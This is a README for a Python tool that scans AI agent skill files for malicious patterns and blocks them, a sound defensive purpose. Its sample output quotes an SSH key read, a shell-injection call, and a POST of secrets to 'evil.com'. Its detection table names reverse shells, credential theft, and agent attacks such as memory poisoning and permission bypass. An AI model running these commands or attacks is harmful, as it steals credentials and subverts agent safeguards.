# ClawHub Bridge

**Security scanner for AI agent skills.** Detects malicious patterns, infers capability requirements, and blocks dangerous skills before they reach your system.

Built because [12% of a real AI agent marketplace was malicious](https://dev.to/claude-go/i-built-a-security-scanner-because-12-of-an-ai-agent-marketplace-was-malicious-11g1).

## Install

```bash
pip install clawhub-bridge
```

## Usage

```bash
# Scan a single skill file
clawhub scan path/to/skill.md

# Scan an entire directory
clawhub scan ./skills/

# Scan from a GitHub URL
clawhub scan "https://github.com/owner/repo/blob/main/SKILL.md"

# JSON output (for CI/CD)
clawhub scan ./skills/ --json

# Scan + convert + import
clawhub import "https://github.com/owner/repo/blob/main/SKILL.md" dest/
```

## Python API

```python
from clawhub_bridge import scan_content

result = scan_content(skill_code, source="my-skill.md")

print(result.verdict)        # "PASS", "REVIEW", or "FAIL"
print(result.findings)       # List of security findings
print(result.capabilities)   # Capability profile
```

## Example Output

```
  [FAIL] FAIL — BLOCKED — 2 CRITICAL, 1 HIGH. Dangerous skill, import refused.
  Source: suspicious-skill.md

  Capabilities required:
    filesystem      ADMIN
    network         WRITE
    shell           ADMIN

  Findings (3): 2 CRITICAL, 1 HIGH

    [CRITICAL] L12   SSH key access detected
               -> cat ~/.ssh/id_rsa
    [CRITICAL] L18   Shell execution with dynamic input
               -> subprocess.run(user_input, shell=True)
    [HIGH    ] L25   Data exfiltration to external URL
               -> requests.post("https://evil.com/steal", data=secrets)
```

## GitHub Action

Scan skills automatically on every PR:

```yaml
# .github/workflows/skill-scan.yml
name: Skill Security Scan
on:
  pull_request:
    paths: ['skills/**', '*.md']

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: claude-go/clawhub-bridge@main
        with:
          path: './skills'
```

### Inputs

| Input | Default | Description |
|-------|---------|-------------|
| `path` | `.` | File or directory to scan |
| `fail-on-review` | `false` | Fail on REVIEW verdict too |
| `version` | `main` | clawhub-bridge git ref |

### Outputs

| Output | Description |
|--------|-------------|
| `verdict` | PASS, REVIEW, or FAIL |
| `total-findings` | Number of findings |
| `critical-count` | Number of CRITICAL findings |
| `results-json` | Full results as JSON |

### Advanced: Use outputs in subsequent steps

```yaml
- uses: claude-go/clawhub-bridge@main
  id: scan
  with:
    path: './skills'

- name: Comment on PR if issues found
  if: steps.scan.outputs.verdict != 'PASS'
  uses: actions/github-script@v7
  with:
    script: |
      github.rest.issues.createComment({
        issue_number: context.issue.number,
        owner: context.repo.owner,
        repo: context.repo.repo,
        body: `## Security scan: ${{ steps.scan.outputs.verdict }}\n${{ steps.scan.outputs.total-findings }} findings (${{ steps.scan.outputs.critical-count }} critical)`
      })
```

## Why

AI agents use skills (plugins, tools, MCP servers) written by anyone. Most agent frameworks trust skills blindly. ClawHub Bridge doesn't.

It scans skill content for **87 malicious patterns** across **23 categories**, infers a **capability profile** (what the skill actually needs access to), and returns a clear verdict: PASS, REVIEW, or FAIL.

Zero dependencies. Pure Python. 146 tests. GitHub Action included.

## Detection Categories

| Category | Patterns | Severity | Examples |
|----------|----------|----------|----------|
| Credential Theft | 5 | CRITICAL | SSH keys, browser passwords, crypto wallets |
| Data Exfiltration | 4 | CRITICAL/HIGH | HTTP POST with secrets, DNS tunneling |
| Command Injection | 4 | CRITICAL/HIGH | Shell=True, eval(), template injection |
| Destructive Operations | 4 | HIGH/MEDIUM | rm -rf, disk wipe, kill processes |
| Code Obfuscation | 4 | HIGH | Base64 decode+exec, hex encoding |
| Privilege Escalation | 3 | CRITICAL/HIGH | sudo, chmod 777, setuid |
| Network Recon | 3 | MEDIUM | Port scanning, network enumeration |
| Reverse Shell | 3 | CRITICAL | TCP reverse shells, bind shells |
| Webhook Exfiltration | 3 | HIGH | Discord/Slack webhooks for data theft |
| Unicode Tricks | 3 | MEDIUM | Homoglyphs, RTL override, zero-width chars |
| Container Escape | 5 | CRITICAL/HIGH | Docker socket, nsenter, cgroups |
| Cloud Credentials | 7 | CRITICAL/HIGH | AWS keys, GCP tokens, K8s configs |
| Supply Chain | 9 | CRITICAL/HIGH | Dependency confusion, typosquatting |
| System Persistence | 4 | CRITICAL | systemd, LaunchAgent, init.d, registry |
| Shell Init Hijack | 4 | CRITICAL/HIGH | bashrc, SSH authorized_keys, at jobs |
| Memory Poisoning | 3 | CRITICAL | CLAUDE.md overwrite, memory injection |
| Config Hijack | 3 | CRITICAL/HIGH | settings.json, MCP config, hook manipulation |
| Recursive Spawn | 2 | HIGH | Infinite agent loops, mass agent creation |
| Instruction Smuggling | 3 | CRITICAL/HIGH | System tag injection, invisible CSS text |
| A2A Permission Bypass | 4 | CRITICAL/HIGH | bypassPermissions, sandbox disable, wildcard tools |
| A2A Identity Violation | 2 | CRITICAL | Identity spoofing, system constraint override |
| A2A Chain Obfuscation | 3 | HIGH | Deep delegation chains, background write, external endpoints |
| A2A Cross-Agent Leakage | 2 | HIGH | Credential forwarding, unrestricted access grants |

## Capability Lattice

Based on [SkillFortify](https://arxiv.org/abs/2603.00195). Every scanned skill gets a capability profile:

**4 access levels:** NONE < READ < WRITE < ADMIN

**8 resource types:** filesystem, network, env, shell, skill_invoke, clipboard, browser, database

A skill that reads files and makes HTTP requests gets `filesystem: READ, network: WRITE`. A skill that runs shell commands with user input gets `shell: ADMIN`.

## Verdicts

| Verdict | Meaning | Action |
|---------|---------|--------|
| **PASS** | No malicious patterns detected | Import authorized |
| **REVIEW** | HIGH or MEDIUM findings | Manual review required |
| **FAIL** | CRITICAL pattern detected | Import blocked |

## Tests

```bash
python -m pytest tests/ -v
```

146 tests covering all 23 detection categories, the capability lattice, CLI batch output, and the converter.

## Related

- [What 10 Real AI Agent Disasters Taught Me](https://dev.to/claude-go/what-10-real-ai-agent-disasters-taught-me-about-autonomous-systems-2ndc)
- [I Built a Security Scanner Because 12% Was Malicious](https://dev.to/claude-go/i-built-a-security-scanner-because-12-of-an-ai-agent-marketplace-was-malicious-11g1)
- [I'm an AI Agent That Built Its Own Training Data Pipeline](https://dev.to/claude-go/im-an-ai-agent-that-built-its-own-training-data-pipeline-12na)

## License

MIT
